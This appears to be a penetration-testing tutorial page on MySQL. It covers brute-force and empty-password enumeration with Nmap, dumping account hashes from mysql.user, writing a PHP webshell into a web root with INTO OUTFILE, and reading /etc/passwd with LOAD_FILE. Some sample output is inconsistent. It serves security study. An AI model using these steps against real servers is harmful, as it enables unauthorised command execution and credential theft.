---
title: MySQL
description: MySQL Database
categories: [Services]
tags: [Services, Database, MySQL]
weight: 2
---
## Service Info
- Name: MySQL
- Purpose: Database
- Listening port: **3306 TCP**
- OS: Unix-Like, Windows

MySQL is an open-source **Structured Query Language (SQL)** database developed and supported by Oracle. It is part of the LAMP stack (Linux, Apache, MySQL, PHP) for web applications. It is also often used to store sensitive information such as user account credentials and personally identifiable information (PII), although passwords are often hashed instead of stored in plaintext.

The best practice for hosting databases is to only allow local machine or internal network access, but misconfigurations can allow them to be accessed through the internet.

MariaDB is a community-developed, commercially supported fork of MySQL. It maintains substantial compatibility with MySQL, but the projects have diverged; client, authentication, SQL, and storage compatibility depend on the versions and features in use.

SQL injection is a vast topic in its own right and is outside the scope of this article.

## Service Enumeration
Nmap scan with all MySQL scripts:
```shell-session
╭─brian@rx-93-nu ~
╰─$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute:
|   Accounts:
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password:
|_  root account has empty password
| mysql-enum:
|   Valid usernames:
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info:
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
```

## Database Engine Interaction
We can connect to a MySQL-compatible database via the `mysql` utility, which allows us to query the database interactively.
```shell-session
╭─brian@rx-93-nu ~
╰─$ mysql -u root -pP4SSw0rd -h 10.129.14.128

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

We can use `select version()` to print out the version of MySQL running on the target.
```shell-session
MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
1 row in set (0.001 sec)
```

### Default Databases
MySQL usually comes with several databases preinstalled by default. These include:
- **mysql**: the main system database, contains database user information such as username, password hashes, and permissions inside the `user` table.
    - The querying account needs `SELECT` privileges on the requested columns or table to read them; this access is normally restricted to administrators.
- **sys**: views, procedures, and functions that help interpret Performance Schema data for diagnostics and tuning.
- **information_schema**: metadata about databases, tables, columns, privileges, and other server objects; it is not mainly sourced from `sys`.


### Database Enumeration
The `show databases` command lists databases visible to the current account:
```shell-session
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)
```
To see the tables inside a database, we can first select the database and then use `show tables`.
```shell-session
MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
...SNIP...
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.002 sec)
```
If we are interested in the contents of a table, we can dump it using `SELECT * FROM <TABLE_NAME>`.
```sql
SELECT * FROM user;
```
We can also see all columns for a table with:
```sql
SHOW COLUMNS FROM user;
```
Then we can specify the column names we are interested in. For the MySQL 8.0 `mysql.user` table shown above, use `User`, `Host`, and `authentication_string`; authentication data depends on the account's plugin.
```sql
SELECT User, Host, authentication_string FROM mysql.user;
```

## MySQL Attacks

### Arbitrary File Read/Write
MySQL supports the reading and writing of system files. The writing of system files is particularly useful when a web server that supports a backend scripting language (PHP, ASP.NET, etc.) is running. This combination allows an attacker who has access to the MySQL server to write a webshell into a web directory, which would give him command execution capabilities on the target.

Server-side file access through `LOAD_FILE()` and `SELECT ... INTO OUTFILE` is subject to SQL privileges, operating-system permissions, and server configuration:
- The querying account needs the `FILE` privilege, and the MySQL server process needs the relevant filesystem access. `INTO OUTFILE` cannot overwrite an existing file.
- The `secure_file_priv` system variable restricts these import/export operations:
    - **Empty**: no directory restriction from this variable; other permission checks still apply.
    - **Name of a directory**: limits these operations to that directory.
    - **NULL**: disables these import/export operations, not all server filesystem access.

We can query the `secure_file_priv` variable:
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```
To see if our current user has file access privilege, we can query the `USER_PRIVILEGES` table under information_schema:
```shell-session
mysql> SELECT * FROM information_schema.USER_PRIVILEGES
    -> WHERE PRIVILEGE_TYPE = 'FILE';
+---------------------+---------------+----------------+--------------+
| GRANTEE             | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |
+---------------------+---------------+----------------+--------------+
| 'root'@'localhost'  | def           | FILE           | YES          |
+---------------------+---------------+----------------+--------------+
2 rows in set (0.001 sec)
```
- Match the full `'user'@'host'` account in `GRANTEE`, not just the username. `USER_PRIVILEGES` is not equivalent to `SHOW GRANTS`.
- Use `SHOW GRANTS;` to inspect the current account's grants and role assignments; consider active roles before concluding that an empty result means the account lacks the privilege.

If we have the `FILE` privilege, the server process can write to the destination, and `secure_file_priv` permits it, we can create a new file using `SELECT ... INTO OUTFILE`.
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

To read from a file, we can use the `LOAD_FILE()` function:
```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

